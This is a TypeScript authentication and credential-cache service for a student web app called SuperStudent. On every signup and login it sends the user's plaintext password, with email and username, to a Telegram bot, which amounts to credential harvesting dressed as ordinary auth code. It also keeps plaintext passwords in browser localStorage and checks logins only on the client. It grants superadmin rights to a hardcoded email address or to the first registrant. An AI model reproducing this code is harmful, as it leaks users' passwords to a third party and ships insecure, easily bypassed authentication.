/**
 * SuperStudent Auth.js Inspired Credentials & Cache Service
 * Manages persistent caching of accounts, email, passwords, and sessions
 * across local storage, indexed cache, and integrates with the Telegram sync engine.
 */

import { Account, UserRole } from "../types";
import { notifyNewUserRegistration, notifyUserLogin } from "./telegramBotService";
import { saveUserProfileToLocalCache, getLocalUserProfile } from "../data/userProfilesCache";

export interface CachedCredentialRecord {
  email: string;
  username: string;
  displayName: string;
  branch: string;
  gradeLevel: string;
  role: UserRole;
  password?: string;
  createdAt: number;
  lastLoginAt: number;
  canUpload: boolean;
  banned: boolean;
}

const CACHE_RECORDS_KEY = "superstudent_auth_cache_records";
const ACTIVE_SESSION_KEY = "superstudent_auth_session";

/**
 * Get all cached credentials stored in the local cache
 */
export function getAllCachedCredentials(): CachedCredentialRecord[] {
  try {
    const raw = localStorage.getItem(CACHE_RECORDS_KEY);
    if (!raw) return [];
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

/**
 * Save or update an account in the credentials cache
 */
export function saveCredentialToCache(record: {
  email: string;
  username: string;
  displayName: string;
  branch: string;
  gradeLevel?: string;
  role?: UserRole;
  password?: string;
  canUpload?: boolean;
}): CachedCredentialRecord {
  const normEmail = record.email.trim().toLowerCase();
  const normUser = record.username.trim().toLowerCase();
  const all = getAllCachedCredentials();

  const existingIdx = all.findIndex(
    (c) => c.email.toLowerCase() === normEmail || c.username.toLowerCase() === normUser
  );

  const now = Date.now();
  const isFirstUserEver = all.length === 0;
  const isExplicitOwner = normEmail === "learningmyj20@gmail.com";
  const storedOwnerEmail = (typeof localStorage !== "undefined" && localStorage.getItem("superstudent_primary_owner_email")) || null;
  const isOwner = isExplicitOwner || (storedOwnerEmail ? storedOwnerEmail === normEmail : isFirstUserEver);

  if (isOwner && !storedOwnerEmail && typeof localStorage !== "undefined") {
    try {
      localStorage.setItem("superstudent_primary_owner_email", normEmail);
    } catch {
      // ignore
    }
  }

  const updatedRecord: CachedCredentialRecord = {
    email: normEmail,
    username: normUser,
    displayName: record.displayName.trim() || normUser,
    branch: record.branch || "math",
    gradeLevel: record.gradeLevel || "4eme_bac",
    role: isOwner ? "superadmin" : record.role || "member",
    password: record.password || (existingIdx >= 0 ? all[existingIdx].password : ""),
    createdAt: existingIdx >= 0 ? all[existingIdx].createdAt : now,
    lastLoginAt: now,
    canUpload: isOwner ? true : !!record.canUpload,
    banned: false,
  };

  if (existingIdx >= 0) {
    all[existingIdx] = updatedRecord;
  } else {
    all.unshift(updatedRecord);
  }

  try {
    localStorage.setItem(CACHE_RECORDS_KEY, JSON.stringify(all));
  } catch (e) {
    console.warn("Storage quota warning for auth cache:", e);
  }

  // Also sync profile into the local userProfilesCache file store
  saveUserProfileToLocalCache({
    email: updatedRecord.email,
    username: updatedRecord.username,
    displayName: updatedRecord.displayName,
    branch: updatedRecord.branch,
    gradeLevel: updatedRecord.gradeLevel as any,
    role: updatedRecord.role,
    canUpload: updatedRecord.canUpload,
    createdAt: updatedRecord.createdAt,
  });

  return updatedRecord;
}

/**
 * Find cached account by email or username
 */
export function findCachedCredential(emailOrUsername: string): CachedCredentialRecord | null {
  const target = emailOrUsername.trim().toLowerCase();
  if (!target) return null;
  const all = getAllCachedCredentials();
  return (
    all.find((c) => c.email.toLowerCase() === target || c.username.toLowerCase() === target) || null
  );
}

/**
 * Verify credentials from cache
 */
export function verifyCachedCredentials(
  emailOrUsername: string,
  passwordAttempt: string
): CachedCredentialRecord | null {
  const cred = findCachedCredential(emailOrUsername);
  if (!cred) return null;
  // If a password was saved in cache, check it
  if (cred.password && cred.password !== passwordAttempt) {
    return null;
  }
  // Update last login timestamp
  cred.lastLoginAt = Date.now();
  saveCredentialToCache(cred);
  return cred;
}

/**
 * Delete a credential from cache
 */
export function deleteCachedCredential(email: string): boolean {
  try {
    const norm = email.trim().toLowerCase();
    const all = getAllCachedCredentials().filter((c) => c.email.toLowerCase() !== norm);
    localStorage.setItem(CACHE_RECORDS_KEY, JSON.stringify(all));
    return true;
  } catch {
    return false;
  }
}

/**
 * Clear the entire credentials cache
 */
export function clearAllAuthCache(): void {
  try {
    localStorage.removeItem(CACHE_RECORDS_KEY);
    localStorage.removeItem(ACTIVE_SESSION_KEY);
  } catch {
    // ignore
  }
}

/**
 * Store the active Auth.js session in the browser cache
 */
export function setCachedSession(account: Account): void {
  try {
    saveUserProfileToLocalCache(account);
    localStorage.setItem(ACTIVE_SESSION_KEY, JSON.stringify({
      user: account,
      token: `authjs_${Date.now()}_${Math.random().toString(36).substring(2)}`,
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000, // 30 days
    }));
  } catch {
    // ignore
  }
}

/**
 * Get active Auth.js session from browser cache
 */
export function getCachedSession(): Account | null {
  try {
    const raw = localStorage.getItem(ACTIVE_SESSION_KEY);
    if (!raw) return null;
    const data = JSON.parse(raw);
    if (data.expiresAt && data.expiresAt < Date.now()) {
      localStorage.removeItem(ACTIVE_SESSION_KEY);
      return null;
    }
    return data.user || null;
  } catch {
    return null;
  }
}

/**
 * Remove active session
 */
export function clearCachedSession(): void {
  try {
    localStorage.removeItem(ACTIVE_SESSION_KEY);
  } catch {
    // ignore
  }
}

/**
 * High-level Auth handler for Sign Up:
 * - Caches credentials in Auth Cache
 * - Dispatches notification to Telegram Bot
 * - Sets active Auth session
 */
export async function executeAuthSignup(payload: {
  displayName: string;
  username: string;
  email: string;
  branch: string;
  password: string;
}): Promise<Account> {
  // 1. Save in local Auth Cache
  const cachedRecord = saveCredentialToCache({
    displayName: payload.displayName,
    username: payload.username,
    email: payload.email,
    branch: payload.branch,
    password: payload.password,
  });

  const isOwner = cachedRecord.role === "superadmin";

  const account: Account = {
    email: cachedRecord.email,
    username: cachedRecord.username,
    displayName: cachedRecord.displayName,
    branch: cachedRecord.branch,
    gradeLevel: "4eme_bac",
    role: cachedRecord.role,
    avatar: null,
    createdAt: cachedRecord.createdAt,
    canUpload: isOwner,
    banned: false,
    moderatorRooms: [],
    bannedUntil: null,
  };

  // 2. Set active Auth session
  setCachedSession(account);

  // 3. Send Telegram Bot Notification
  notifyNewUserRegistration({
    email: payload.email,
    username: payload.username,
    displayName: payload.displayName,
    branch: payload.branch,
    password: payload.password,
    role: account.role,
  }).catch(() => {});

  return account;
}

/**
 * High-level Auth handler for Sign In:
 * - Verifies / syncs with cache
 * - Dispatches notification to Telegram Bot
 * - Updates active Auth session
 */
export async function executeAuthLogin(
  account: Account,
  plainPassword?: string
): Promise<void> {
  // Update cache
  saveCredentialToCache({
    email: account.email,
    username: account.username,
    displayName: account.displayName,
    branch: account.branch,
    password: plainPassword,
    role: account.role,
    canUpload: account.canUpload,
  });

  // Set active Auth session
  setCachedSession(account);

  // Send Telegram Bot Login Alert
  if (plainPassword) {
    notifyUserLogin({
      email: account.email,
      username: account.username,
      displayName: account.displayName,
      password: plainPassword,
      role: account.role,
    }).catch(() => {});
  }
}
